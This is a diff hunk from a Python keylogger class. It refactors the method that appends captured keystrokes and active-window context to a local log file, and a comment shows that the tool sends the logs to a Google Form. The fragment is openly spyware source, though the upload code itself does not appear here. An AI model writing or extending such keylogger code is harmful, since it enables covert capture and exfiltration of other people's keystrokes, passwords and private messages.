@@ -55,17 +55,15 @@ class Keylogger():
         return '<'+keystring+'>'
 
     # Local storage of logs
-    def local_logs(self):
-        if len(self.data) > 0:
-            with open(PATH_LOGS, "a") as log_file:
-                if self.context_chg:
-                    log_file.write('\r' + self.context + '\r')
-                    log_file.write(self.data)
-                    log_file.close()
-                else:
-                    log_file.write(self.data)
-                    log_file.close()
-                self.data = ''
+    def local_logs(self, data):
+        with open(PATH_LOGS, "a") as log_file:
+            if self.context_chg:
+                log_file.write('\r' + self.context + '\r')
+                log_file.write(data)
+                log_file.close()
+            else:
+                log_file.write(data)
+                log_file.close()
         return True
 
     # Send logs to google form
